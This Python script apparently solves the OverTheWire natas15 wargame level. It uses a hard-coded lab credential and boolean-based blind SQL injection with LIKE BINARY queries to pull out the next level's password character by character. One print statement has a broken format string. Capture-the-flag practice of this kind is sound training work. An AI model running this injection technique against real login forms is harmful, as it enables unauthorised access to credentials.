#! /bin/python
import requests, string
url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []
exists_str = "This user exists"
"""
for c in characters:
    uri = ''.join([url, '?' , 'username=natas16"', '+and+password+LIKE+BINARY+"%' ,c, '%' , '&debug' ])
    r = requests.get(uri, auth=(username, password))
    if exists_str in r.text:
        passchar.append(c)
        print("> {0}".format(''.join(passchar)))
print("Character List: {0}".format(''.join(passchar)))

"""
secret =''
passchar = ['2','3','5','7','9','a','d','f','g','i','j','k','l','q','r','u','A','D','E','H','O','P','R','T','V','Z']
for place in range(1,33):
    print ("Character# <1".format(str(place)))
    for char in passchar:
        temp = ''.join([secret,char])
        uri = ''.join([url, '?' , 'username=natas16"', '+and+password+LIKE+BINARY+"' ,temp, '%' , '&debug' ])
        r = requests.get(uri, auth=(username, password))
        if exists_str in r.text:
            secret += char
            print("Password : {}".format(secret))
